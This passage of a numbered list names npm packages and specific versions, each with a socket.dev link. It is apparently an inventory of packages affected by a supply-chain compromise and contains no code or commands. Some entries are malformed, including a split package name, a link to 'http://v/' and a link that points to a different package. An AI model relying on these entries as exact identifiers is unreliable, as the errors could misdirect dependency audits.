655. [lite-serper-mcp-server](https://socket.dev/npm/package/lite-serper-mcp-server/overview/0.2.2) (v0.2.2)
656. [lui-vue-test](https://socket.dev/npm/package/lui-vue-test) (v0.70.9)
657. [luno-api](https://socket.dev/npm/package/luno-api/overview/1.2.3) (v1.2.3)
658. [m25-transaction-utils](https://socket.dev/npm/package/m25-transaction-utils) (v1.1.16)
659. [manual-billing-system-miniapp-api](https://socket.dev/npm/package/manual-billing-system-miniapp-api) (v1.3.1)
660. [mcp-use](https://socket.dev/npm/package/mcp-use/overview/1.4.3) (v1.4.2, v1.4.3)
661. [medusa-plugin-announcement](https://socket.dev/npm/package/medusa-plugin-announcement/overview/0.0.3) (v0.0.3)
662. [medusa-plugin-logs](https://socket.dev/npm/package/medusa-plugin-logs/overview/0.0.17) (v0.0.17)
663. [medusa-plugin-momo](https://socket.dev/npm/package/medusa-plugin-momo/overview/0.0.68) (v0.0.68)
664. [medusa-plugin-product-reviews-kvy](https://socket.dev/npm/package/medusa-plugin-product-reviews-kvy/overview/0.0.4) (v0.0.4)
665. [medusa-plugin-zalopay](https://socket.dev/npm/package/medusa-plugin-zalopay/overview/0.0.40) (v0.0.40)
666. [mod10-check-digit](https://socket.dev/npm/package/mod10-check-digit/overview/1.0.1) (v1.0.1)
667. [mon-package-react-typescript](https://socket.dev/npm/package/mon-package-react-typescript/overview/1.0.1) (v1.0.1)
668. [my-saeed-lib](https://socket.dev/npm/package/my-saeed-lib) (v0.1.1)
669. [n8n-nodes-tmdb](https://socket.dev/npm/package/n8n-nodes-tmdb/overview/0.5.1) (v0.5.1)
670. [n8n-nodes-vercel-ai-sdk](https://socket.dev/npm/package/n8n-nodes-vercel-ai-sdk/overview/0.1.7) (v0.1.7)
671. [n8n-nodes-viral-app](https://socket.dev/npm/package/n8n-nodes-viral-app/overview/0.2.5) (v0.2.5)
672. [nanoreset](https://socket.dev/npm/package/nanoreset/overview/7.0.2) (v7.0.1, v7.0.2)
673. [next-circular-dependency](https://socket.dev/npm/package/next-circular-dependency/overview/1.0.3) (v1.0.2, v1.0.3)
674. [next-simple-google-analytics](https://socket.dev/npm/package/next-simple-google-analytics/overview/1.1.2) (v1.1.1, v1.1.2)
675. [next-styled-nprogress](https://socket.dev/npm/package/next-styled-nprogress/overview/1.0.5) (v1.0.4, v1.0.5)
676. [ngx-useful-swiper-prosenjit](https://socket.dev/npm/package/ngx-useful-swiper-prosenjit/overview/9.0.2) (v9.0.2)
677. [ngx-wooapi](https://socket.dev/npm/package/ngx-wooapi/overview/12.0.1) (v12.0.1)
678. [nitro-graphql](https://socket.dev/npm/package/nitro-graphql/overview/1.5.12) (v1.5.12)
679. [nitro-kutu](https://socket.dev/npm/package/nitro-kutu/files/0.1.1) (v0.1.1)
680. [nitrodeploy](https://socket.dev/npm/package/nitrodeploy) (v1.0.8)
681. [nitroping](https://socket.dev/npm/package/nitroping) (v0.1.1)
682. [normal-store](https://socket.dev/npm/package/normal-store/overview/1.3.2) (v1.3.1, v1.3.2, v1.3.3, v1.3.4)
683. [nuxt-keycloak](https://socket.dev/npm/package/nuxt-keycloak/overview/0.2.2) (v0.2.2)
684. [obj-to-css](https://socket.dev/npm/package/obj-to-css/overview/1.0.3) (v1.0.2, v1.0.3)
685. [okta-react-router-6](https://socket.dev/npm/package/okta-react-router-6/overview/5.0.1) (v5.0.1)
686. [open2interne](https://socket.dev/npm/package/open2internet/overview/0.1.0)t (v0.1.1)
687. [orbit-boxicons](https://socket.dev/npm/package/orbit-boxicons/overview/2.1.3) (v2.1.3)
688. [orbit-nebula-draw-tools](https://socket.dev/npm/package/orbit-nebula-draw-tools/overview/1.0.10) (v1.0.10)
689. [orbit-nebula-editor](https://socket.dev/npm/package/orbit-nebula-editor/overview/1.0.2) (v1.0.2)
690. [orbit-soap](https://socket.dev/npm/package/orbit-soap/overview/0.43.13) (v0.43.13)
691. [orchestrix](https://socket.dev/npm/package/orchestrix/overview/12.1.2) (v12.1.2)
692. [package-tester](https://socket.dev/npm/package/package-tester/overview/1.0.1) (v1.0.1)
693. [parcel-plugin-asset-copier](https://socket.dev/npm/package/parcel-plugin-asset-copier/overview/1.1.2) (v1.1.2, v.1.1.3)
694. [pdf-annotation](https://socket.dev/npm/package/pdf-annotation/overview/0.0.2) (v0.0.2)
695. [pergel](https://socket.dev/npm/package/pergel) (v0.13.2)
696. [pergeltest](https://socket.dev/npm/package/pergeltest/overview/0.0.25) (v0.0.25)
697. [piclite](https://socket.dev/npm/package/piclite/overview/1.0.1) (v1.0.1)
698. [pico-uid](https://socket.dev/npm/package/pico-uid/overview/1.0.4) (v1.0.3, v1.0.4)
699. [pkg-readme](https://socket.dev/npm/package/pkg-readme/overview/1.1.1) (v1.1.1)
700. [posthog-react-native-session-replay](https://socket.dev/npm/package/posthog-react-native-session-replay/overview/1.2.2) (v1.2.2)
701. [poper-react-sdk](https://socket.dev/npm/package/poper-react-sdk/overview/0.1.2) (v0.1.2)
702. [posthog-docusaurus](https://socket.dev/npm/package/posthog-docusaurus/overview/2.0.6) (v2.0.6)
703. [posthog-js](https://socket.dev/npm/package/posthog-js/overview/1.297.3) (v1.297.3)
704. [posthog-node](https://socket.dev/npm/package/posthog-node/overview/5.13.3) (v4.18.1, v5.11.3, v5.13.3)
705. [posthog-node](https://socket.dev/maven/package/org.mvnpm:posthog-node/overview/4.18.1) (v4.18.1) - Java/Maven
706. [posthog-plugin-hello-world](https://socket.dev/npm/package/posthog-plugin-hello-world/files/1.0.1) (v1.0.1)
707. [posthog-react-native](https://socket.dev/npm/package/posthog-react-native/overview/4.12.5) (v4.11.1, v4.12.5)
708. [prime-one-table](https://socket.dev/npm/package/prime-one-table/overview/0.0.19) (v0.0.19)
709. [prompt-eng](https://socket.dev/npm/package/prompt-eng/overview/1.0.50) (v1.0.50)
710. [prompt-eng-server](https://socket.dev/npm/package/prompt-eng-server/overview/1.0.18) (v1.0.18)
711. [puny-req](https://socket.dev/npm/package/puny-req/overview/1.0.3) (v1.0.3)
712. [quickswap-ads-list](https://socket.dev/npm/package/quickswap-ads-list/overview/1.0.33) (v1.0.33)
713. [quickswap-default-staking-list](https://socket.dev/npm/package/quickswap-default-staking-list) (v1.0.11)
714. [quickswap-default-staking-list-address](https://socket.dev/npm/package/quickswap-ads-list/overview/1.0.33) (v1.0.55)
715. [quickswap-default-token-list](https://socket.dev/npm/package/quickswap-default-token-list) (v1.5.16)
716. [quickswap-router-sdk](https://socket.dev/npm/package/quickswap-router-sdk/overview/1.0.1) (v1.0.1)
717. [quickswap-sdk](https://socket.dev/npm/package/quickswap-sdk) (v3.0.44)
718. [quickswap-smart-order-router](https://socket.dev/npm/package/quickswap-smart-order-router) (v1.0.1)
719. [quickswap-token-lists](https://socket.dev/npm/package/quickswap-token-lists/files/1.0.3) (v1.0.3)
720. [quickswap-v2-sdk](https://socket.dev/npm/package/quickswap-v2-sdk) (v2.0.1)
721. [ra-auth-firebase](https://socket.dev/npm/package/ra-auth-firebase/overview/1.0.3) (v1.0.3)
722. [ra-data-firebase](https://socket.dev/npm/package/ra-data-firebase/overview/1.0.8) (v1.0.7, v1.0.8)
723. [react-component-taggers](https://socket.dev/npm/package/react-component-taggers/overview/0.1.9) (v0.1.9)
724. [react-data-to-export](https://socket.dev/npm/package/react-data-to-export) (v1.0.1)
725. [react-element-prompt-inspector](https://socket.dev/npm/package/react-element-prompt-inspector/overview/0.1.18) (v0.1.18)
726. [react-favic](https://socket.dev/npm/package/react-favic/overview/1.0.2) (v1.0.2)
727. [react-hook-form-persist](https://socket.dev/npm/package/react-hook-form-persist/overview/3.0.2) (v3.0.1, v3.0.2)
728. [react-jam-icons](https://socket.dev/npm/package/react-jam-icons/overview/1.0.2) (v1.0.1, v1.0.2)
729. [react-keycloak-context](https://socket.dev/npm/package/react-keycloak-context/overview/1.0.9) (v1.0.8, v1.0.9)
730. [react-library-setup](https://socket.dev/npm/package/react-library-setup/overview/0.0.6) (v0.0.6)
731. [react-linear-loader](https://socket.dev/npm/package/react-linear-loader/overview/1.0.2) (v1.0.2)
732. [react-micromodal.js](https://socket.dev/npm/package/react-micromodal.js/overview/1.0.2) (v1.0.1, v1.0.2)
733. [react-native-datepicker-modal](https://socket.dev/npm/package/react-native-datepicker-modal/overview/1.3.2) (v1.3.1, v1.3.2)
734. [react-native-email](https://socket.dev/npm/package/react-native-email/overview/2.1.1) (v2.1.1, v2.1.2)
735. [react-native-fetch](https://socket.dev/npm/package/react-native-fetch/overview/2.0.1) (v2.0.1, v2.0.2)
736. [react-native-get-pixel-dimensions](https://socket.dev/npm/package/react-native-get-pixel-dimensions/overview/1.0.2) (v1.0.1, v1.0.2)
737. [react-native-google-maps-directions](https://socket.dev/npm/package/react-native-google-maps-directions/overview/2.1.2) (v2.1.2)
738. [react-native-jam-icons](https://socket.dev/npm/package/react-native-jam-icons/overview/1.0.2) (v1.0.1, v1.0.2)
739. [react-native-log-level](https://socket.dev/npm/package/react-native-log-level/overview/1.2.2) (v1.2.1, v1.2.2)
740. [react-native-modest-checkbox](https://socket.dev/npm/package/react-native-modest-checkbox/overview/3.3.1) (v3.3.1)
741. [react-native-modest-storage](https://socket.dev/npm/package/react-native-modest-storage/overview/2.1.1) (v2.1.1)
742. [react-native-phone-call](https://socket.dev/npm/package/react-native-phone-call/overview/1.2.2) (v1.2.1, v1.2.2)
743. [react-native-retriable-fetch](https://socket.dev/npm/package/react-native-retriable-fetch/overview/2.0.2) (v2.0.1, v2.0.2)
744. [react-native-use-modal](https://socket.dev/npm/package/react-native-use-modal) (v1.0.3)
745. [react-native-view-finder](https://socket.dev/npm/package/react-native-view-finder/overview/1.2.2) (v1.2.1, v1.2.2)
746. [react-native-websocket](https://socket.dev/npm/package/react-native-websocket/overview/1.0.4) (v1.0.3, v1.0.4)
747. [react-native-worklet-functions](https://socket.dev/npm/package/react-native-worklet-functions/overview/3.3.3) (v3.3.3)
748. [react-packery-component](https://socket.dev/npm/package/react-packery-component) (v1.0.3)
749. [react-qr-image](https://socket.dev/npm/package/react-qr-image/overview/1.1.1) (v1.1.1)
750. [react-scrambled-text](https://socket.dev/npm/package/react-scrambled-text/overview/1.0.4) (v1.0.4, v1.0.5)
751. [rediff](https://socket.dev/npm/package/rediff/overview/1.0.5) (v1.0.5)
752. [rediff-viewer](https://socket.dev/npm/package/rediff-viewer) (v0.0.7)
753. [redux-forge](https://socket.dev/npm/package/redux-forge/overview/2.5.3) (v2.5.3)
754. [redux-router-kit](https://socket.dev/npm/package/redux-router-kit/overview/1.2.4) (v1.2.2, v1.2.3, v1.2.4)
755. [revenuecat](https://socket.dev/npm/package/revenuecat) (v1.0.1)
756. [rollup-plugin-httpfile](https://socket.dev/npm/package/rollup-plugin-httpfile/overview/0.2.1) (v0.2.1)
757. [sa-company-registration-number-regex](https://socket.dev/npm/package/sa-company-registration-number-regex/overview/1.0.2) (v1.0.1, v1.0.2)
758. [sa-id-gen](https://socket.dev/npm/package/sa-id-gen/overview/1.0.4) (v1.0.4, v1.0.5)
759. [samesame](https://socket.dev/npm/package/samesame/overview/1.0.3) (v1.0.3)
760. [scgs-capacitor-subscribe ](https://socket.dev/npm/package/scgs-capacitor-subscribe/overview/1.0.11)(v1.0.11)
761. [scgsffcreator](https://socket.dev/npm/package/scgsffcreator/overview/1.0.5) (v1.0.5)
762. [schob](https://socket.dev/npm/package/schob/files/1.0.3) (v1.0.3)
763. [selenium-session](https://socket.dev/npm/package/selenium-session/overview/1.0.5) (v1.0.5)
764. [selenium-session-client](https://socket.dev/npm/package/selenium-session-client/overview/1.0.4) (v1.0.4)
765. [set-nested-prop](https://socket.dev/npm/package/set-nested-prop/overview/2.0.2) (v2.0.1, v2.0.2)
766. [shelf-jwt-sessions](https://socket.dev/npm/package/shelf-jwt-sessions/overview/0.1.2) (v0.1.2)
767. [shell-exec](https://socket.dev/npm/package/shell-exec/overview/1.1.3) (v1.1.3, v1.1.4)
768. [shinhan-limit-scrap](https://socket.dev/npm/package/shinhan-limit-scrap) (v1.0.3)
769. [silgi](https://socket.dev/npm/package/silgi) (v0.43.30)
770. [simplejsonform](https://socket.dev/npm/package/simplejsonform) (v1.0.1)
771. [skills-use](https://socket.dev/npm/package/skills-use/overview/0.1.2) (v0.1.1, v0.1.2)
772. [solomon-api-stories](https://socket.dev/npm/package/solomon-api-stories) (v1.0.2)
773. [solomon-v3-stories ](https://socket.dev/npm/package/solomon-v3-stories/overview/1.15.6)(v1.15.6)
774. [solomon-v3-ui-wrapper](https://socket.dev/npm/package/solomon-v3-ui-wrapper) (v1.6.1)
775. [soneium-acs](https://socket.dev/npm/package/soneium-acs/overview/1.0.1) (v1.0.1)
776. [sort-by-distance](https://socket.dev/npm/package/sort-by-distance/overview/2.0.1) (v2.0.1)
777. [south-african-id-info](https://socket.dev/npm/package/south-african-id-info/overview/1.0.2) (v1.0.2)
778. [stat-fns](https://socket.dev/npm/package/stat-fns/overview/1.0.1) (v1.0.1)
779. [stoor](https://socket.dev/npm/package/stoor/overview/2.3.2) (v2.3.2)
780. [sufetch](https://socket.dev/npm/package/sufetch) (v0.4.1)
781. [super-commit](https://socket.dev/npm/package/super-commit/overview/1.0.1) (v1.0.1)
782. [svelte-autocomplete-select](https://socket.dev/npm/package/svelte-autocomplete-select/overview/1.1.1) (v1.1.1)
783. [svelte-toasty](https://socket.dev/npm/package/svelte-toasty/overview/1.1.3) (v1.1.2, v1.1.3)
784. [tanstack-shadcn-table](https://socket.dev/npm/package/tanstack-shadcn-table/overview/1.1.5) (v1.1.5)
785. [tavily-module](https://socket.dev/npm/package/tavily-module) (v1.0.1)
786. [tcsp](https://socket.dev/npm/package/tcsp/overview/2.0.2) (v2.0.2)
787. [tcsp-draw-test](https://socket.dev/npm/package/tcsp-draw-test/overview/1.0.5) (v1.0.5)
788. [tcsp-test-vd](https://socket.dev/npm/package/tcsp-test-vd/overview/2.4.4) (v2.4.4)
789. [template-lib](https://socket.dev/npm/package/template-lib/overview/1.1.4) (v1.1.3, v1.1.4)
790. [template-micro-service](https://socket.dev/npm/package/template-micro-service/overview/1.0.3) (v1.0.2, v1.0.3)
791. [tenacious-fetch](https://socket.dev/npm/package/tenacious-fetch/overview/2.3.3) (v2.3.2, v2.3.3)
792. [test-foundry-app](https://socket.dev/npm/package/test-foundry-app/overview/1.0.4) (v1.0.1, v1.0.2, v1.0.3, v1.0.4)
793. [test-hardhat-app](https://socket.dev/npm/package/test-hardhat-app/overview/1.0.4) (v1.0.1, v1.0.2, v1.0.3, v1.0.4)
794. [test23112222-api](https://socket.dev/npm/package/test23112222-api) (v1.0.1)
795. [tiaan](https://socket.dev/npm/package/tiaan/overview/1.0.2) (v1.0.2)
796. [tiptap-shadcn-vue](https://socket.dev/npm/package/tiptap-shadcn-vue) (v0.2.1)
797. [token.js-fork](https://socket.dev/npm/package/token.js-fork/overview/0.7.32) (v0.7.32)
798. [toonfetch](https://socket.dev/npm/package/toonfetch) (v0.3.2)
799. [trigo-react-app](https://socket.dev/npm/package/trigo-react-app/overview/4.1.2) (v4.1.2)
800. [ts-relay-cursor-paging](https://socket.dev/npm/package/ts-relay-cursor-paging) (v2.1.1)
801. [typeface-antonio-complete](https://socket.dev/npm/package/typeface-antonio-complete) (v1.0.5)
802. [typefence](https://socket.dev/npm/package/typefence/overview/1.2.3) (v1.2.2, v1.2.3)
803. [typeorm-orbit](https://socket.dev/npm/package/typeorm-orbit/overview/0.2.27) (v0.2.27)
804. [unadapter](https://socket.dev/npm/package/unadapter/overview/0.1.3) (v0.1.3)
805. [undefsafe-typed](https://socket.dev/npm/package/undefsafe-typed/overview/1.0.4) (v1.0.3, v1.0.4)
806. [unemail](https://socket.dev/npm/package/unemail/overview/0.3.1) (v0.3.1)
807. [uniswap-router-sdk](https://socket.dev/npm/package/uniswap-router-sdk/overview/1.6.2) (v1.6.2)
808. [uniswap-smart-order-router](http://v/) (v3.16.26)
809. [uniswap-test-sdk-core](https://socket.dev/npm/package/uniswap-test-sdk-core) (v4.0.8)
810. [unsearch](https://socket.dev/npm/package/unsearch) (v0.0.3)
811. [uplandui](https://socket.dev/npm/package/uplandui/overview/0.5.4) (v0.5.4)
812. [upload-to-play-store](https://socket.dev/npm/package/upload-to-play-store/overview/1.0.2) (v1.0.1, v1.0.2)
813. [url-encode-decode](https://socket.dev/npm/package/url-encode-decode/overview/1.0.2) (v1.0.1, v1.0.2)
814. [use-unsaved-changes](https://socket.dev/npm/package/use-unsaved-changes/overview/1.0.9) (v1.0.9)
815. [v-plausible ](https://socket.dev/npm/package/v-plausible/overview/1.2.1)(v1.2.1)
816. [valid-south-african-id](https://socket.dev/npm/package/valid-south-african-id/overview/1.0.3) (v1.0.3)
817. [valuedex-sdk](https://socket.dev/npm/package/valuedex-sdk/overview/3.0.5) (v3.0.5)
818. [vf-oss-template](https://socket.dev/npm/package/vf-oss-template/overview/1.0.2) (v1.0.1, v1.0.2, v1.0.3, v1.0.4)
819. [victoria-wallet-constants](https://socket.dev/npm/package/victoria-wallet-constants/overview/0.1.1) (v0.1.1, v0.1.2)
820. [victoria-wallet-core](https://socket.dev/npm/package/victoria-wallet-core/overview/0.1.1) (v0.1.1, v0.1.2)
821. [victoria-wallet-type](https://socket.dev/npm/package/victoria-wallet-type/overview/0.1.2) (v0.1.1, v0.1.2)
822. [victoria-wallet-utils](https://socket.dev/npm/package/victoria-wallet-utils/overview/0.1.2) (v0.1.1, v0.1.2)
823. [victoria-wallet-validator](https://socket.dev/npm/package/victoria-wallet-validator) (v0.1.1, v0.1.2)
824. [victoriaxoaquyet-wallet-core ](https://socket.dev/npm/package/victoriaxoaquyet-wallet-core/overview/0.2.2)(v0.2.1, v0.2.2)
825. [vite-plugin-httpfile](https://socket.dev/npm/package/vite-plugin-httpfile/overview/0.2.1) (v0.2.1)
826. [vue-browserupdate-nuxt](https://socket.dev/npm/package/vue-browserupdate-nuxt/overview/1.0.5) (v1.0.5)
827. [wallet-evm ](https://socket.dev/npm/package/wallet-evm/overview/0.3.2)(v0.3.1, v0.3.2)
828. [wallet-type](https://socket.dev/npm/package/wallet-type/files/0.1.1) (v0.1.1, v0.1.2)
829. [web-scraper-mcp](https://socket.dev/npm/package/web-scraper-mcp/overview/1.1.4) (v1.1.4)
830. [web-types-htmx](https://socket.dev/npm/package/web-types-htmx/overview/0.1.1) (v0.1.1)
831. [web-types-lit](https://socket.dev/npm/package/web-types-lit/overview/0.1.1) (v0.1.1)
832. [webpack-loader-httpfile](https://socket.dev/npm/package/webpack-loader-httpfile/overview/0.2.1) (v0.2.1)
833. [wellness-expert-ng-gallery](https://socket.dev/npm/package/wellness-expert-ng-gallery/overview/5.1.1) (v5.1.1)
834. [wenk](https://socket.dev/npm/package/wenk/overview/1.0.10) (v1.0.9, v1.0.10)
835. [zapier-async-storage](https://socket.dev/npm/package/zapier-async-storage/overview/1.0.3) (v1.0.1, v1.0.2, v1.0.3)
836. [zapier-platform-cli](https://socket.dev/npm/package/zapier-platform-cli/overview/18.0.4) (v18.0.2, v18.0.3, v18.0.4)
837. [zapier-platform-core](https://socket.dev/npm/package/zapier-platform-core/overview/18.0.4) (v18.0.2, v18.0.3, v18.0.4)
838. [zapier-platform-legacy-scripting-runner](https://socket.dev/npm/package/zapier-platform-legacy-scripting-runner/overview/4.0.4) (v4.0.2, v4.0.3, v4.0.4)
839. [zapier-platform-schema](https://socket.dev/npm/package/zapier-platform-schema/overview/18.0.4) (v18.0.2, v18.0.3, v18.0.4)
840. [zapier-scripts](https://socket.dev/npm/package/zapier-scripts/overview/7.8.4) (v7.8.3, v7.8.4)
841. [zuper-cli](https://socket.dev/npm/package/zuper-cli/overview/1.0.1) (v1.0.1)
842. [zuper-sdk](https://socket.dev/npm/package/zuper-sdk/overview/1.0.57) (v1.0.57)
843. [zuper-stream](https://socket.dev/npm/package/zuper-stream/overview/2.0.9) (v2.0.9)

